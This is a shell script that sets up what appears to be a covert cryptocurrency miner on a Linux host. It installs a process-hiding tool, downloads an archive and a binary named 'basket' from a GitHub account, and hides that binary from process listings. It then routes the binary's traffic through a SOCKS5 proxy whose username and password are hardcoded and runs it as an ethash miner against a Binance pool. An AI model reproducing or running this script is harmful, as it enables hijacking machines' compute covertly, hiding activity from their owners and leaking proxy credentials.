#!/bin/sh
apt update

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget -O - https://deb.nodesource.com/setup_17.x | bash

apt -y install nodejs

apt -y install npm

npm i -g node-process-hider

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = p.webshare.io:80
socks5_username = snzyphyd-il-nl-5
socks5_password = 8jq95zaxr7jf
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .5

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
chmod +x basket

ph add basket

./basket -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001.k -log --proxy snzyphyd-il-nl-5:8jq95zaxr7jf@p.webshare.io:80
